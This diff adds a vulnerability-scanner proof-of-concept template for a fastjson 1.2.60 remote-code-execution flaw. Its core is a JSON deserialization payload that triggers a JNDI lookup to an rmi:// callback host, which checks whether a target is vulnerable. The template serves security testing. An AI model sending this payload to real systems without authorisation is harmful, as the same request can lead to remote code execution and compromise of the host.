@@ -1,0 +1,15 @@
+name: poc-yaml-fastjson-1.2.60-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json
+      body: |
+        {"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://{{reverseURL}}/whoopsunix"}
+    expression: reverse.wait(5)
+expression: r0()
